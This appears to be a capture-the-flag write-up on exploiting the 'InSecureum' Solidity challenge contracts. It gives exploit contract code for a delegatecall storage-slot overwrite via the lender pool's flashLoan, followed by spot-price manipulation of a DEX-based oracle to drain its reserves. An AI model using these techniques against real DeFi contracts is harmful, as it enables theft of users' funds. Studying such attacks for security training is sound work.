-------
This challenge's main difficulty was getting inside the logic that made all 5 contracts work together. 

#### Exploit contract state variables:

```
    IERC20 public tokenInsecureum;
    mapping(address => uint) public balances;  // MUST be at this slot
    uint public lenderAmount;
    IERC20 public tokenBoring;
    address public owner;
    BorrowSystemInsecureOracle public oracle;
    InsecureDexLP public insecureDex;
    InSecureumLenderPool public lenderPool;
```

This is very important, as the correct implementation of state variables mean correct reference to storage slots, which will allow us to properly change values stored in a target smart contract that has unprotected delegateCall.

#### From [Layout of State Variables in Storage](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html):
* The first item in a storage slot is stored lower-order aligned.
* Value types use only as many bytes as are necessary to store them.
* If a value type does not fit the remaining part of a storage slot, it is stored in the next storage slot.
* Structs and array data always start a new slot and their items are packed tightly according to these rules.
* Items following struct or array data always start a new storage slot.

#### Constructor

I've opted to initiate the exploit contract by passing target contracts addresses as constructor arguments. That meant I had to utilize the contracts as the types passed at the constructor function.

```
    constructor(IERC20 _tokenInsecureum, 
                IERC20 _tokenBoring, 
                BorrowSystemInsecureOracle _oracle, 
                InsecureDexLP _insecureDex, 
                InSecureumLenderPool _lenderPool ) 
    {
        tokenInsecureum = _tokenInsecureum;
        tokenBoring = _tokenBoring;
        oracle = _oracle;
        insecureDex = _insecureDex;
        lenderPool = _lenderPool;
        owner = msg.sender;
    }
```

A second option would be to create interfaces for interaction with these contracts and utilize addresses as constructor arguments. After that we'd pass the contract's types and it's corresponding addresses in order to make external function calls.  

```
  InSecureumLenderPool lenderPool = InSecureumLenderPool(lenderPoolAddress);
  lenderPool.flashLoan(argument1, argument2);
```

### Part 1

The first thing to do was deploying a delegateCall attack as the InSecureumLenderPool allowed delegateCalls with user input.

```
function bytesGenerator (address attacker) public pure returns(bytes memory){
       return abi.encodeWithSignature("attack(address)", attacker);
    }

function startFlashLoan(address attacker, bytes calldata data) public {
        lenderPool.flashLoan(attacker, data);
    }
```

First put the attacker's address at the bytesGenerator function to get the value used as the 'data' argument for startFlashLoan. 
This will make the lender Pool's contract make a delegate call to our attack function, which will execute a state change that will update the attacker's balance.

```
function attack(address attacker)  public returns(bool) {
        uint totals = tokenInsecureum.totalSupply();
        balances[attacker] = totals/3;
        return true;
    }
```

Once it's done, we can now withdraw all (10k) Insecureum tokens from the Lender Pool and get started with the Oracle contract.

### Part 2

I've withdrawn this balance to my own address.
Then I've transfered the token to the exploit contract and proceeded by loaning 5k Insecureum Token units and borrowing 100 Boring Token units at the Oracle. 
This is very important as the Insecure Swap Pool only has 100 units of each token. 

```
 function getLoan(uint amount, uint amount2) public onlyOwner{
        tokenInsecureum.approve(address(oracle), amount);
        oracle.depositToken0(amount);
        oracle.borrowToken1(amount2);
    }
```

### Part 3

I've purchased 98 Boring Token units with 5k Insecureum Token units. And in order not to risk getting liquidated by any third party at the Oracle's smart contract, I've deposited the whole amount at the Oracle's pool.
What this will do is provide me a LOT of solvency funds to sweep away (via a borrowToken0 function call) all the 15k Insecureum Token units stored by the Oracle's reserve - since the Oracle calculates my solvency status based on the Swap's Contract current prices. If we take into account that the Solvency status only gets processed once, based on the initial state of the spot price we can infer that at the first borrowToken0 transaction, each Boring Token deposited at the contract will be able to borrow 1888,8888888888888888888888888889 Insecureum Token units.

#### Explanation:
```
  From the Swap's contract:
   function _calcAmountsOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns(uint256 amountOut) {
        amountIn = amountIn * 1000;
        uint numerator = amountIn * reserveOut;
        uint denominator = reserveIn * 1000 + amountIn;
        amountOut = (numerator / denominator);
    }
  1 Boring Token units in = 1700 Insecureum Token units out.
  We need to take into account that there's a (100/90 * 100)% LTV(Loan-to-value) at the Oracle, so it's 
  1700 * 10/9 Insecureum Token units per Boring Token unit deposited.

``` 

Execute the sweep.

```
function swap(uint amount, uint amount2) public onlyOwner{
        tokenInsecureum.approve(address(insecureDex), amount);
        insecureDex.swap(address(tokenInsecureum), address(tokenBoring), amount);
        tokenBoring.approve(address(oracle), amount2);
        oracle.depositToken1(amount2);
        uint oraclesToken0Balance = tokenInsecureum.balanceOf(address(oracle));
        oracle.borrowToken0(oraclesToken0Balance);
    }
```
